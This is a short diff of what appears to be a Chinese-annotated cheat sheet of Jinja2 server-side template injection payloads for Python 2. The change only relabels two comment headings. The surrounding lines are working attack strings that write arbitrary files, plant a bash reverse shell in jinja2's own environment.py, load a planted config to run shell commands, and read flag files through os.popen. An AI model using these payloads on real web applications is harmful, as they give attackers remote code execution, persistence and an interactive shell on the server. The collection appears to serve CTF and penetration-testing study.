@@ -36,11 +36,11 @@ python2
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/1').write("") }}
 #假设在/usr/lib/python2.7/dist-packages/jinja2/environment.py, 弹一个shell
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/usr/lib/python2.7/dist-packages/jinja2/environment.py').write("\nos.system('bash -i >& /dev/tcp/[IP_ADDR]/[PORT] 0>&1')") }}
-#代码执行
+#命令执行1
 name=%7B%7B ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') %7D%7D
 name=%7B%7B config.from_pyfile('/tmp/owned.cfg') %7D%7D 
 name=%7B%7B%20config[%27RUNCMD%27](%27/usr/bin/id%27,shell=True)%20%7D%7D
-#命令执行
+#命令执行2
 {{''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['popen']('cat flag*').read()}}
 
 
